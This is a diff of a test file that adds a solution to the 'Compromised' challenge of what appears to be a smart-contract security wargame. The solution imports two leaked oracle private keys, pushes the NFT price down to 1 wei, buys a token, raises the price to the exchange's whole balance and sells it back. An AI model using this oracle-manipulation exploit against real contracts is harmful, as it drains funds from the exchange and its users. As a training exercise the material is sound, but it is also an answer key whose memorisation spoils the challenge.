@@ -12,10 +12,10 @@ describe('Compromised challenge', function () {
         '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
     ];
 
-    const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
-    const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
-    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
-    const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n;
+    const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n; // 999ETH
+    const INITIAL_NFT_PRICE = 999n * 10n ** 18n; // 999ETH
+    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n; // 0.1ETH
+    const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n; // 2ETH
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
@@ -53,6 +53,34 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const symbol = await nftToken.symbol()
+        const ORACLE_1 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider)
+        const ORACLE_2 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider)
+
+        // Set price to 1
+        console.log("price before", (await oracle.getMedianPrice(symbol)).toString())
+        await oracle.connect(ORACLE_1).postPrice(symbol, 1)
+        await oracle.connect(ORACLE_2).postPrice(symbol, 1)
+        console.log("price after", (await oracle.getMedianPrice(symbol)).toString())
+        
+        // Buy NFT with 1 wei
+        const tx = await exchange.connect(player).buyOne({value: 1})
+        const rc = await tx.wait()
+        const id = rc.events.find(e => e.event == "TokenBought").args.tokenId
+
+        // Set price to 999 ETH + 1 wei
+        console.log("price before", (await oracle.getMedianPrice(symbol)).toString())
+        await oracle.connect(ORACLE_1).postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE + 1n)
+        await oracle.connect(ORACLE_2).postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE + 1n)
+        console.log("price after", (await oracle.getMedianPrice(symbol)).toString())
+
+        // Sell NFT
+        await nftToken.connect(player).approve(exchange.address, id)
+        await exchange.connect(player).sellOne(id)
+
+        // Set price to 999 ETH
+        await oracle.connect(ORACLE_1).postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE)
+        await oracle.connect(ORACLE_2).postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE)
     });
 
     after(async function () {
